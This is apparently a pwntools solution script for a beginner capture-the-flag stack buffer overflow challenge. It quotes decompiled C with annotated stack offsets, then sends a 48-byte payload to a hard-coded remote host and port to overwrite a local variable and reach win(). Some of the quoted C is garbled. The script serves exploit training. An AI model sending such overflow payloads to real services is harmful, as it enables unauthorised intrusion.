from pwn import *

class Getting_started:
    functions = '''
        void buffer_demo(void) {
            puts("  |_____________|
            printf("|             | <- %d bytes\n",L' ');
            printf("|  Buffer[%d] |\n",31); -> Buffer size (32)
            puts("  |_____________|");
            puts("  |      .      |");
            puts("  |      .      |");
            puts("  |_____________|");
            puts("  |             |");
            puts("  |  Buffer[0]  |");
            puts("  |_____________| <- Lower addresses");
            return;
        }

        else if ((long)local_c * 8 + param_1 == param_1 + 40) { -> target to change (8 + 40) = 48
            printf("0x%016lx | %s0x%016lx%s",(long)local_c * 8 + param_1,&DAT_00102209,
             *(undefined8 *)(param_1 + (long)local_c * 8),&DAT_00102054);
            printf(" <- %sTarget to change%s\n",&DAT_00102209,&DAT_00102054);
        }
        else {
            printf("0x%016lx | 0x%016lx",(long)local_c * 8 + param_1,
             *(undefined8 *)(param_1 + (long)local_c * 8));

            if ((long)local_c * 8 + param_1 == param_1 + 32) { -> aligment value (8 + 32) = 40
                printf(" <- Dummy value for alignment");
            }
            if ((long)local_c * 8 + param_1 == param_1 + 48) { -> saved rbp (8 + 48) = 56
                printf(" <- Saved rbp");
            }
            if ((long)local_c * 8 + param_1 == param_1 + 56) {
                printf(" <- Saved return address");
            }
        }
    '''

    # Si local_10 == 0xdeadbeef, print space, else call win()
    # The objective is to override local_10 with any value to get win()
    solution = '''
        if (local_10 == 0xdeadbeef) {
            putchar(0x20);
        } else {
            win();
        }
    '''

    def main(self): 
        ip = '94.237.54.192'
        port = 31914

        context.binary = './gs'
        context.log_level = 'warn'

        conn = remote(ip, port)
        
        # Parámetros para el payload
        buff_size = 32          # Tamaño del buffer (32 bytes)
        target_offset = 48      # Offset al target (48 bytes)

        # Construcción del payload
        payload = b'A' * buff_size  # Llenar buffer (32 bytes)
        payload += b'B' * (target_offset - buff_size)  # Sobrescribir saved rbp (16 bytes)
        
        conn.sendline(payload)

        conn.interactive()

if __name__ == '__main__':
    Getting_started().main()
